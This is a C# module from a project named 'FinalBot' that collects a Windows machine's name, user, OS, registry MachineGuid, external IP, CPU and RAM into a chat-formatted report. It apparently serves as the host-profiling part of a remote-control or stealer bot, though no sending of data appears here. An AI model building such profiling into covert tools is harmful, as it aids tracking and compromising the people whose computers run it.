using System;
using System.IO;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace FinalBot.Modules
{
    public static class SystemInfoModule
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private class MEMORYSTATUSEX
        {
            public uint dwLength;
            public uint dwMemoryLoad;
            public ulong ullTotalPhys;
            public ulong ullAvailPhys;
            public ulong ullTotalPageFile;
            public ulong ullAvailPageFile;
            public ulong ullTotalVirtual;
            public ulong ullAvailVirtual;
            public ulong ullAvailExtendedVirtual;
            public MEMORYSTATUSEX()
            {
                this.dwLength = (uint)Marshal.SizeOf<MEMORYSTATUSEX>();
            }
        }

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool GlobalMemoryStatusEx([In, Out] MEMORYSTATUSEX lpBuffer);

        public static string GetSystemInfo()
        {
            var sb = new StringBuilder();
            sb.AppendLine("📋 *SYSTEM INFORMATION*");
            sb.AppendLine($"🏁 *PC:* {Environment.MachineName}");
            sb.AppendLine($"👤 *User:* {Environment.UserName}");
            sb.AppendLine($"🌐 *OS:* {Environment.OSVersion}");
            sb.AppendLine($"🆔 *HWID:* {GetHWID()}");
            sb.AppendLine($"📡 *IP:* {GetExternalIP()}");
            sb.AppendLine($"🔋 *CPU:* {GetCPUName()}");
            sb.AppendLine($"🧠 *RAM:* {GetTotalRAM()} GB");

            return sb.ToString();
        }

        public static string GetHWID()
        {
            try 
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
                {
                    if (key != null)
                    {
                        var val = key.GetValue("MachineGuid");
                        if (val != null) return val.ToString();
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        public static string GetExternalIP()
        {
            try 
            {
                using (var client = new System.Net.Http.HttpClient())
                {
                    client.Timeout = TimeSpan.FromSeconds(5);
                    var task = client.GetStringAsync("https://api.ipify.org");
                    if (task.Wait(5000)) return task.Result;
                    return "Timeout";
                }
            }
            catch { return "Unknown"; }
        }

        private static string GetCPUName()
        {
            try 
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0"))
                {
                    if (key != null)
                    {
                        var val = key.GetValue("ProcessorNameString");
                        if (val != null) return val.ToString().Trim();
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private static string GetTotalRAM()
        {
            try 
            {
                MEMORYSTATUSEX memStatus = new MEMORYSTATUSEX();
                if (GlobalMemoryStatusEx(memStatus))
                {
                    return (memStatus.ullTotalPhys / 1024 / 1024 / 1024).ToString();
                }
            }
            catch { }
            return "Unknown";
        }
    }
}
